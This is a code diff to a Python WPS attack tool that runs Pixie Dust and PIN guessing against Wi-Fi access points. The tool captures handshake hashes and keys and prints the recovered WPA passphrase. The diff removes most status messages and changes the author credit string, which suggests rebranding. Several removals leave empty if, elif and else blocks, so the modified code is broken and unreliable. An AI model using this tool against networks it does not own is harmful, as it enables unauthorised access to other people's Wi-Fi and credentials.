@@ -475,16 +475,15 @@ class Companion:
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
-                print('[*] Sending WPS Message M{}…'.format(n))
+                
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
-                print('[*] Received WPS Message M{}'.format(n))
+                
                 if n == 5:
                     print('[+] The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
-                print('[*] Received WSC NACK')
                 print('[-] Error: wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
@@ -495,27 +494,22 @@ class Companion:
                 self.pixie_creds.pkr = get_hex(line)
                 assert(len(self.pixie_creds.pkr) == 192*2)
                 if pixiemode:
-                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
                 assert(len(self.pixie_creds.pke) == 192*2)
                 if pixiemode:
-                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
                 assert(len(self.pixie_creds.authkey) == 32*2)
                 if pixiemode:
-                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash1) == 32*2)
                 if pixiemode:
-                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 assert(len(self.pixie_creds.e_hash2) == 32*2)
                 if pixiemode:
-                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
@@ -539,20 +533,15 @@ class Companion:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-            print('[*] Associating with AP…')
         elif ('Associated with' in line) and (self.interface in line):
             bssid = line.split()[-1].upper()
             if self.connection_status.essid:
                 print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
             else:
-                print('[+] Associated with {}'.format(bssid))
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            print('[*] Sending EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
-            print('[*] Received Identity Request')
         elif 'using real identity' in line:
-            print('[*] Sending Identity Response…')
 
         return True
 
@@ -575,9 +564,7 @@ class Companion:
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
-        print(f"[+] WPS PIN: '{wps_pin}'")
-        print(f"[+] WPA PSK: '{wpa_psk}'")
-        print(f"[+] AP SSID: '{essid}'")
+        print(f"[+] WIFI PASSWORD: '{wpa_psk}'")
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         if not os.path.exists(self.reports_dir):
@@ -638,7 +625,6 @@ class Companion:
         self.pixie_creds.clear()
         self.connection_status.clear()
         self.wpas.stdout.read(300)   # Clean the pipe
-        print(f"[*] Trying PIN '{pin}'…")
         r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
@@ -1185,7 +1171,7 @@ if __name__ == '__main__':
                 else:
                     args.bssid = None
             else:
-                print("\nAborting…\nStay With\nTHBD")
+                print("\nAborting…\nStay With\nN1s4t")
                 break
 
     if args.iface_down:
